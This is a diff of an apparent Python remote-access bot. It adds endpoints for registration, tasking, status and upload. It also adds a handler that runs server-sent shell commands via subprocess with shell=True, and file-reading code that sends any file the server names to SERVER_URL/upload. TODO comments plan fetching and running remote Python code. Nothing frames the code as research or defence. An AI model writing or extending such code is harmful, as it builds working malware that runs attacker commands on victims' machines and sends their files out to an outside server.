@@ -21,9 +21,25 @@ from the server, and drop the wheel to disk, and then import.
 """
 
 """
+TODO: need a download/put file function
+"""
+
+"""
+TODO: need to come up with a clever way to run the python
+maybe pipe to stdin or something similar
+"""
+
+"""
+TODO: need to change to use urllib or something that is in the standard
+library, or drop it to disk with requests
+"""
+
+"""
 Endpoints to implement:
 /register : POST JSON of device_metadata ; return token
-
+/info     : GET with token ; return tasking (if any)
+/status   : POST command id and output ; return status code
+/upload   : POST file id and output ; return status code
 
 """
 
@@ -170,6 +186,9 @@ def execute_command(cmd):
     cmd_str = cmd.get('cmd_str')
     cmd_id  = cmd.get('cmd_id')
 
+    if not cmd_id or not cmd_str:
+        return None
+
     output = subprocess.check_output(
         cmd_str,
         shell=True,
@@ -187,9 +206,37 @@ def execute_command(cmd):
 def get_content(upload):
     """
         upload_id : GUID of upload from server
-        upload_str : 
+        upload_str : path to retrieve for upload
     """
-    pass
+    
+    upload_id = upload.get('upload_id')
+    upload_str = upload.get('upload_str')
+
+    if not upload_id or not upload_str:
+        return None
+
+    try:
+        # Reads whole file into memory;
+        # may not work well with large files
+        p = Path(upload_str)
+        with p.open("rb") as f:
+            data = f.read()
+            return {
+                'upload_id': upload_id,
+                'output': data
+            }
+
+    except FileNotFoundError as e:
+        data = e 
+    except PermissionError as e:
+        data = e
+    except OSError as e:
+        data = e
+
+    return {
+        'upload_id': upload_id,
+        'output': data
+    }
 
 def post_cmd_output(bot_token, output_dict):
     """
@@ -208,11 +255,22 @@ def post_cmd_output(bot_token, output_dict):
     else:
         return None
    
-def post_content(url, content):
+def post_content(bot_token, content_dict):
     """
         Post requested content to discord server.
     """
-    pass
+    endpoint = "/upload"
+    full_url = SERVER_URL + endpoint
+
+    headers = {
+        "X-API-TOKEN": bot_token
+    }
+
+    response = requests.post(full_url, headers=headers, data=content_dict)
+    if response:
+        return response.status_code
+    else:
+        return None
 
 if __name__ == "__main__":
     main()
